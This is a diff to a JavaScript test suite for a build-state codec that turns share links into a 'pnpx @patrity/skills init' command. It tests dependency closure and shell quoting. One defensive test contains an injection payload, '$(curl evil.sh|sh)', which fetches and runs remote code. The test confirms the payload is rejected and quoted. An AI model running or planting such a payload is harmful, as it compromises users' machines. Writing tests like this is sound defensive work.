@@ -6,16 +6,17 @@ const manifest = fixtureManifest()
 
 describe('build state codec', () => {
   it('round-trips a complete state', () => {
-    // Every axis is answered, because decoding always fills the unanswered ones from the
-    // defaults + profile: only a complete state can round-trip to itself.
+    // Every axis is answered and the bundle list is closed over `dependsOn` (third needs second),
+    // because decoding fills the unanswered axes and closes the list: only a state that is already
+    // both can round-trip to itself.
     const s = {
       profile: 'demo',
       projectName: 'my app',
       answers: { pm: 'pnpm', layout: 'monorepo', appDir: 'apps/x/app', browser: 'none' },
-      bundles: ['demo', 'third']
+      bundles: ['demo', 'second', 'third']
     }
     const hash = encodeBuildState(s)
-    expect(hash).toBe('p=demo&n=my%20app&a=pm:pnpm,layout:monorepo,appDir:apps%2Fx%2Fapp,browser:none&b=demo,third')
+    expect(hash).toBe('p=demo&n=my%20app&a=pm:pnpm,layout:monorepo,appDir:apps%2Fx%2Fapp,browser:none&b=demo,second,third')
     expect(decodeBuildState(hash, manifest)).toEqual({ state: s, warnings: [] })
   })
 
@@ -64,13 +65,38 @@ describe('build state codec', () => {
       .toBe('pnpx @patrity/skills init --yes --profile demo')
   })
 
-  it('quotes an answer that contains a space', () => {
-    const state = {
+  it('leaves shell-safe values unquoted and single-quotes everything else', () => {
+    const base = {
       profile: null,
       projectName: 'x',
-      answers: { pm: 'pnpm', layout: 'monorepo', appDir: 'apps/my app', browser: 'cli' },
+      answers: { pm: 'pnpm', layout: 'monorepo', appDir: 'apps/web/app', browser: 'cli' },
       bundles: ['demo', 'second']
     }
-    expect(cliCommand(state, manifest)).toBe('pnpx @patrity/skills init --yes --answer layout=monorepo --answer appDir="apps/my app"')
+    // Plain values stay bare; `layout=monorepo` and a path answer are both in the safe class.
+    expect(cliCommand({ ...base, answers: { ...base.answers, appDir: 'apps/x_1/app' } }, manifest))
+      .toBe('pnpx @patrity/skills init --yes --answer layout=monorepo --answer appDir=apps/x_1/app')
+    // A space is not shell-safe.
+    expect(cliCommand({ ...base, answers: { ...base.answers, appDir: 'apps/my app' } }, manifest))
+      .toBe(String.raw`pnpx @patrity/skills init --yes --answer layout=monorepo --answer appDir='apps/my app'`)
+    // A single quote is closed, escaped and reopened, so the shell still reads one literal word.
+    expect(cliCommand({ ...base, answers: { ...base.answers, appDir: 'it\'s' } }, manifest))
+      .toBe(String.raw`pnpx @patrity/skills init --yes --answer layout=monorepo --answer appDir='it'\''s'`)
+  })
+
+  it('never lets a command substitution out of a share link unquoted', () => {
+    // The value is rejected outright at the door...
+    const payload = 'apps/web/$(curl evil.sh|sh)'
+    const { state, warnings } = decodeBuildState(`a=layout:monorepo,appDir:${encodeURIComponent(payload)}`, manifest)
+    expect(state.answers.appDir).toBe('apps/web/app')
+    expect(warnings).toEqual(['appDir: value contains unsupported characters'])
+    // ...and quoted even if one reaches `cliCommand` by another route.
+    const rendered = cliCommand({ profile: null, projectName: 'x', answers: { appDir: payload }, bundles: [] }, manifest)
+    expect(rendered).toBe(`pnpx @patrity/skills init --yes --answer appDir='${payload}'`)
+  })
+
+  it('closes the decoded bundle list over dependsOn', () => {
+    // `third` dependsOn `second`; a hand-edited link that names only `third` must not leave the
+    // form showing an unticked `second` the plan installs anyway.
+    expect(decodeBuildState('b=third', manifest).state.bundles).toEqual(['second', 'third'])
   })
 })
